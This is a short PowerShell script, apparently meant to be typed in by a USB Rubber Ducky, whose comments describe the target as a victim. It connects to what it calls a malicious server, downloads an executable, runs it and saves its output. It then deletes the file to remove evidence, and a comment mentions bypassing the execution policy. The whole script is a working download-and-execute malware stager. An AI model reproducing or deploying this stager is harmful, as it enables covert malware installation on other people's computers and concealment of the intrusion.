<# 
    Writing this in powershell, since we're going to try having a Rubber Ducky pick up this script and run it
    We can't guarentee the victim will have any programming languages installed outside of what's in default Windows OS.

    The logic is the same as what we have in the EXE client: connect to malicious service/server, download exe file, and run it.
    
    Documentation - https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-8.0 
#>

$IP_ADDR = "127.0.0.1";
$PORT = "8081";

# Create TCP object and connect to port.
$TCP_CLIENT = New-Object System.Net.Sockets.TcpClient;
$TCP_CLIENT.Connect($IP_ADDR, $PORT);

# Grab the stream and attach a Binary Reader to it since StreamReaders are designed for ASCII text
$STREAM = $TCP_CLIENT.GetStream();
$READ_STREAM = New-Object System.IO.BinaryReader($STREAM)

# Create a list to store the bytes
$BYTES = New-Object 'System.Collections.Generic.List[System.Byte]'

# Chuck all the read data into a PS1 file.
while ($STREAM.DataAvailable) 
{
    $byte = $READ_STREAM.ReadByte()
    $BYTES.Add($byte)
}
[System.IO.File]::WriteAllBytes('./ls_read.exe', $BYTES.ToArray());

# Formally closes the TCP Connection - At this point, FIN from Node server should have been sent, so this just sends FIN ACK.
# ⭐ Side Note: After this runs, Node.js server should report "Session Terminated."
$TCP_CLIENT.Close();

# Execution Policy isn't a security feature - so we can just bypass that
# $OUTPUT = powershell.exe -ExecutionPolicy Bypass -File "./ls_read.exe";
$OUTPUT = ./ls_read.exe;
$OUTPUT > "./output.txt";

# Get rid of evidence
Remove-Item "./ls_read.exe";